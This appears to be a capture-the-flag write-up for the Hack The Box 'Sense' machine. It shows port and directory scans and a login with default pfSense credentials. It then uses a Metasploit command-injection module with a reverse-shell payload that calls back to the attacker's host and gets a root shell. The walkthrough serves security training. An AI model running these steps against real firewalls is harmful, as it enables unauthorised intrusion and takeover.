# Hackthebox Sense

First reset the machine.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ sudo nmap -A -T4 -p- 10.10.10.60
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-27 09:48 EST
Nmap scan report for 10.10.10.60
Host is up (0.035s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): Comau embedded (92%)
Aggressive OS guesses: Comau C4G robot control unit (92%)
No exact OS matches for host (test conditions non-ideal).
```

Nmap vulnerability scan 

```
$ nmap --script vuln 10.10.10.60
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-27 09:51 EST
Nmap scan report for 10.10.10.60
Host is up (0.035s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
443/tcp open  https
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /javascript/sorttable.js: Secunia NSI
|   /changelog.txt: Interesting, a changelog.
|_  /tree/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
|             Modulus Type: Non-safe prime
|             Modulus Source: RFC5114/1024-bit DSA group with 160-bit prime order subgroup
|             Modulus Length: 1024
|             Generator Length: 1024
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.securityfocus.com/bid/70574
|_sslv2-drown: 

```

Interesting file /changelog.txt

```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

The file /tree reveals SilverStripe tree control v0.1 from 2005.

Scan other directories

```
$ gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k              1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/27 10:03:50 Starting gobuster in directory enumeration mode
===============================================================
/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]   
/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]   
/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]   
/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]      
/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/] 
/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/] 
/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]   
/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]      
/filebrowser          (Status: 301) [Size: 0] [--> https://10.10.10.60/filebrowser/]
/%7Echeckout%7E       (Status: 403) [Size: 345] 
```

Also scan typical files

```
$ gobuster dir -u https://10.10.10.60 -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -k -t 20   
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2021/12/27 12:42:42 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 6690]
/help.php             (Status: 200) [Size: 6689]
/stats.php            (Status: 200) [Size: 6690]
/edit.php             (Status: 200) [Size: 6689]
/license.php          (Status: 200) [Size: 6692]
/system.php           (Status: 200) [Size: 6691]
/status.php           (Status: 200) [Size: 6691]
/changelog.txt        (Status: 200) [Size: 271] 
/exec.php             (Status: 200) [Size: 6689]
/graph.php            (Status: 200) [Size: 6690]
/tree/                (Status: 200) [Size: 7492]
/wizard.php           (Status: 200) [Size: 6691]
/pkg.php              (Status: 200) [Size: 6688]
/installer/           (Status: 302) [Size: 0] [--> installer.php]
/xmlrpc.php           (Status: 200) [Size: 384]                  
/reboot.php           (Status: 200) [Size: 6691]                 
/interfaces.php       (Status: 200) [Size: 6695]                 
/system-users.txt     (Status: 200) [Size: 106]
```

Opening the url gives us the login page to an old pfsense, the same can be found from subdirectory /installer.

systems-users -file looks definitely something interesting.

```
$ curl https://10.10.10.60/system-users.txt -k                                                                       60 ⨯
####Support ticket###

Please create the following user


username: Rohit
password: company defaults         
```

And we can login to pfsense with username "rohit" and password "pfsense", which is the default one.

## Vulnerability analysis

### PFSense

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
pfSense - 'interfaces.php?if' Cross-Site Scripting                                        | hardware/remote/35071.txt
pfSense - 'pkg.php?xml' Cross-Site Scripting                                              | hardware/remote/35069.txt
pfSense - 'pkg_edit.php?id' Cross-Site Scripting                                          | hardware/remote/35068.txt
pfSense - 'status_graph.php?if' Cross-Site Scripting                                      | hardware/remote/35070.txt
pfSense - (Authenticated) Group Member Remote Command Execution (Metasploit)              | unix/remote/43193.rb
pfSense 2 Beta 4 - 'graph.php' Multiple Cross-Site Scripting Vulnerabilities              | php/remote/34985.txt
pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / Remote Command Execut | php/webapps/23901.txt
pfSense 2.1 build 20130911-1816 - Directory Traversal                                     | php/webapps/31263.txt
pfSense 2.2 - Multiple Vulnerabilities                                                    | php/webapps/36506.txt
pfSense 2.2.5 - Directory Traversal                                                       | php/webapps/39038.txt
pfSense 2.3.1_1 - Command Execution                                                       | php/webapps/43128.txt
pfSense 2.3.2 - Cross-Site Scripting / Cross-Site Request Forgery                         | php/webapps/41501.txt
Pfsense 2.3.4 / 2.4.4-p3 - Remote Code Injection                                          | php/webapps/47413.py
pfSense 2.4.1 - Cross-Site Request Forgery Error Page Clickjacking (Metasploit)           | php/remote/43341.rb
pfSense 2.4.4-p1 (HAProxy Package 0.59_14) - Persistent Cross-Site Scripting              | php/webapps/46538.txt
pfSense 2.4.4-p1 - Cross-Site Scripting                                                   | multiple/webapps/46316.txt
pfSense 2.4.4-p3 (ACME Package 0.59_14) - Persistent Cross-Site Scripting                 | php/webapps/46936.txt
pfSense 2.4.4-P3 - 'User Manager' Persistent Cross-Site Scripting                         | freebsd/webapps/48300.txt
pfSense 2.4.4-p3 - Cross-Site Request Forgery                                             | php/webapps/48714.txt
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                            | php/webapps/43560.py
pfSense Community Edition 2.2.6 - Multiple Vulnerabilities                                | php/webapps/39709.txt
pfSense Firewall 2.2.5 - Config File Cross-Site Request Forgery                           | php/webapps/39306.html
pfSense Firewall 2.2.6 - Services Cross-Site Request Forgery                              | php/webapps/39695.txt
pfSense UTM Platform 2.0.1 - Cross-Site Scripting                                         | freebsd/webapps/24439.txt
------------------------------------------------------------------------------------------ ---------------------------------


## Initial access

### CVE-2016-10709

First test the vulnerability using Metasploit.

```
$ msfconsole -q
msf6 > search pfsense

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     No     Clickjacking Vulnerability In CSRF Error Page pfSense
   1  exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  No     pfSense authenticated graph status RCE
   2  exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  Yes    pfSense authenticated group member RCE


Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/http/pfsense_group_member_exec

msf6 > use 1
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/http/pfsense_graph_injection_exec) > show options

Module options (exploit/unix/http/pfsense_graph_injection_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          yes       Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-
                                        Metasploit
   RPORT     443              yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   USERNAME  admin            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/http/pfsense_graph_injection_exec) > set rhosts 10.10.10.60
rhosts => 10.10.10.60
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set username rohit
username => rohit
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set lhost 10.10.14.20
lhost => 10.10.14.20
msf6 exploit(unix/http/pfsense_graph_injection_exec) > show payloads

Compatible Payloads
===================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  payload/generic/custom                                     normal  No     Custom Payload
   1  payload/generic/shell_reverse_tcp                          normal  No     Generic Command Shell, Reverse TCP Inline
   2  payload/multi/meterpreter/reverse_http                     normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   3  payload/multi/meterpreter/reverse_https                    normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
   4  payload/php/download_exec                                  normal  No     PHP Executable Download and Execute
   5  payload/php/exec                                           normal  No     PHP Execute Command
   6  payload/php/meterpreter/reverse_tcp                        normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   7  payload/php/meterpreter/reverse_tcp_uuid                   normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   8  payload/php/reverse_perl                                   normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
   9  payload/php/reverse_php                                    normal  No     PHP Command Shell, Reverse TCP (via PHP)

msf6 exploit(unix/http/pfsense_graph_injection_exec) > set payload 1
payload => generic/shell_reverse_tcp
msf6 exploit(unix/http/pfsense_graph_injection_exec) > show options

Module options (exploit/unix/http/pfsense_graph_injection_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          yes       Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    10.10.10.60      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-
                                        Metasploit
   RPORT     443              yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   USERNAME  rohit            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.20      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/http/pfsense_graph_injection_exec) > run

[*] Started reverse TCP handler on 10.10.14.20:4444 
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[+] Deleted kVlKSoCnV
[*] Command shell session 1 opened (10.10.14.20:4444 -> 10.10.10.60:31132) at 2021-12-27 14:02:34 -0500


ls -al
total 7160
drwxr-xr-x   2 nobody  wheel     512 Dec 27 14:03 .
drwxr-xr-x  12 root    wheel     512 Dec 27 12:28 ..
-rw-r--r--   1 nobody  wheel   47696 Dec 27 14:03 GW_WAN-quality.rrd
-rw-r--r--   1 nobody  wheel   47696 Oct 15  2017 WAN_DHCP-quality.rrd
-rw-r--r--   1 root    wheel    2041 Dec 27 13:39 ZYrticF
-rw-r--r--   1 root    wheel    2041 Dec 27 13:52 cqMfBchjI
-rw-r--r--   1 nobody  wheel  393168 Dec 27 14:02 ipsec-packets.rrd
-rw-r--r--   1 nobody  wheel  393168 Dec 27 14:02 ipsec-traffic.rrd
-rw-r--r--   1 nobody  wheel  588592 Dec 27 14:02 system-mbuf.rrd
-rw-r--r--   1 nobody  wheel  735320 Dec 27 14:02 system-memory.rrd
-rw-r--r--   1 nobody  wheel  245976 Dec 27 14:02 system-processor.rrd
-rw-r--r--   1 nobody  wheel  245976 Dec 27 14:02 system-states.rrd
-rw-r--r--   1 root    wheel    3683 Dec 27 11:28 updaterrd.sh
-rw-r--r--   1 nobody  wheel  393168 Dec 27 14:02 wan-packets.rrd
-rw-r--r--   1 nobody  wheel  393168 Dec 27 14:02 wan-traffic.rrd
whoami
root
ls -al /root/root.txt
```
